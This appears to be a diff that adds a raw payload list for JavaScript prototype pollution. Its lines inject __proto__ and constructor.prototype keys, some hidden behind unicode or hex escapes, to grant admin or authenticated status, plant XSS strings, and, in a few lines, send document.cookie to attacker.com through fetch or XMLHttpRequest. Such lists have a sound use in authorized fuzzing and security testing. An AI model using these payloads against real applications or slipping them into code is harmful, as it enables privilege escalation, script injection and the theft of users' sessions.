@@ -1,0 +1,98 @@
+{"__proto__":{"toString":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"toString":"<script>alert(1)</script>"}}
+{"constructor":{"prototype":{"toString":"<img src=x onerror=alert(1)>"}}}
+{"constructor":{"prototype":{"toString":"<script>alert(1)</script>"}}}
+{"__proto__":{"toString":{"valueOf":"<img src=x onerror=alert(1)>"}}}
+{"constructor":{"prototype":{"toString":{"valueOf":"<img src=x onerror=alert(1)>"}}}}
+{"constructor":{"prototype":{"innerHTML":"<img src=x onerror=alert(1)>"}}}
+{"constructor":{"prototype":{"valueOf":"<img src=x onerror=alert(1)>"}}}
+{"__proto__":{}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"admin":true}}
+{"__proto__":{"role":"admin"}}
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"constructor":{"prototype":{"admin":true}}}
+{"constructor":{"prototype":{"role":"admin"}}}
+{"__proto__":{"polluted":"yes"}}
+{"__proto__.polluted":"yes"}
+{"__proto__[polluted]":"yes"}
+{"constructor.prototype.polluted":"yes"}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+{"__proto__":{"polluted":true}}
+{"__proto__.polluted":true}
+{"__proto__[polluted]":true}
+{"constructor.prototype.polluted":true}
+{"constructor":{"prototype":{"polluted":true}}}
+{"__proto__":null}
+{"0":{"constructor":{"prototype":{"data":"randomValue"}}}}
+{"__proto__":{"__defineGetter__":"constructor.constructor('alert(1)')()"}}
+{"__proto__":{"__defineSetter__":"constructor.constructor('alert(1)')()"}}
+{"__proto__":{"__lookupGetter__":"constructor.constructor('alert(1)')()"}}
+{"__proto__":{"__lookupSetter__":"constructor.constructor('alert(1)')()"}}
+{"constructor":{"prototype":{"__proto__":null}}}
+{"constructor":{"prototype":{"__defineGetter__":"constructor.constructor('alert(1)')()"}}}}
+{"constructor":{"prototype":{"__defineSetter__":"constructor.constructor('alert(1)')()"}}}}
+{"constructor":{"prototype":{"__lookupGetter__":"constructor.constructor('alert(1)')()"}}}}
+{"constructor":{"prototype":{"__lookupSetter__":"constructor.constructor('alert(1)')()"}}}}
+{"__proto__":{"valueOf":{"toString":"I'm polluted"}}}
+{"__proto__":{"valueOf":function() { return "polluted"; }}}
+{"__proto__":{"toString":function() { return "polluted"; }}}
+{"constructor":{"prototype":{"valueOf":function() { return "polluted"; }}}}
+{"constructor":{"prototype":{"toString":function() { return "polluted"; }}}}
+{"__proto__":"prototype"}
+{"constructor":"prototype"}
+{"constructor.prototype":"prototype"}
+{"__proto__.constructor":"prototype"}
+{"__proto__.__proto__":"prototype"}
+{"__proto__\u003a__":{"isAdmin":true}}
+{"\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f":{"isAdmin":true}}
+{"__pr\x6ft\x6f__":{"isAdmin":true}}
+{"__proto__":{"__proto__":{"isAdmin":true}}}
+{"__proto__":{"constructor":{"prototype":{"isAdmin":true}}}}
+{"__proto__":{"__defineGetter__":"function() { return true; }"}}
+{"constructor":{"prototype":{"__defineGetter__":"function() { return true; }"}}}
+{"constructor":{"prototype":{"hasOwnProperty":"function() { return false; }"}}}
+{constructor:{prototype:{hasOwnProperty:function() {return false;}}}}
+{"__proto__":{"constructor.prototype.someProperty":"polluted"}}
+{"__proto__":{"a":1,"b":2,"c":3}}
+{"__proto__":{"x":"polluted","y":"polluted2","z":"polluted3"}}
+{"__proto__":{"test":{"nested":"value"}}}
+{"__proto__":{"test":{"nested":{"deep":"value"}}}}
+{"__proto__":{"username":"admin","password":"admin"}}
+{"__proto__":{"login":"admin","pass":"admin"}}
+{"__proto__":{"user":"admin","pwd":"admin"}}
+{"__proto__":{"authenticated":true}}
+{"__proto__":{"loggedIn":true}}
+{"__proto__":{"debug":true}}
+{"__proto__":{"verbose":true}}
+{"__proto__":{"dev":true}}
+{"__proto__":{"environment":"debug"}}
+{"__proto__":{"toString":"<svg onload=alert(document.domain)>"}}
+{"__proto__":{"toString":"<iframe srcdoc=\"<script>alert(document.domain)</script>\">"}}
+{"__proto__":{"toString":"<img src=x onerror=fetch('https://attacker.com/'+document.cookie)>"}}
+{"__proto__":{"toString":"<script>document.write('<img src=\"https://attacker.com/?c='+document.cookie+'\" />')</script>"}}
+{"__proto__":{"toJSON":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"toString":"console.log(document.cookie)"}}
+{"__proto__":{"toString":"(function(){var x=new XMLHttpRequest();x.open('GET','https://attacker.com/?c='+document.cookie);x.send();})();"}}
+{"__proto__":{"data-*":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"src":"javascript:alert(1)"}}
+{"__proto__":{"href":"javascript:alert(1)"}}
+{"__proto__":{"action":"javascript:alert(1)"}}
+{"__proto__":{"location":"javascript:alert(1)"}}
+{"__proto__":{"srcdoc":"<script>alert(1)</script>"}}
+{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"outerHTML":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"body":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"text":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"template":"<img src=x onerror=alert(1)>"}}
+{"__proto__":{"evalScript":"alert(1)"}}
+{"__proto__":{"execScript":"alert(1)"}}
+{"__proto__":{"eval":"alert(1)"}}
+{"__proto__":{"Function":"return alert(1)"}}
+{"__proto__":{"setTimeout":"alert(1)"}}
+{"__proto__":{"setInterval":"alert(1)"}}
+{"__proto__":{"script":"alert(1)"}}
+{"__proto__":{"onload":"alert(1)"}}
+{"__proto__":{"onerror":"alert(1)"}}
+{"__proto__":{"onmouseover":"alert(1)"}}
+{"__proto__":{"onclick":"alert(1)"}}
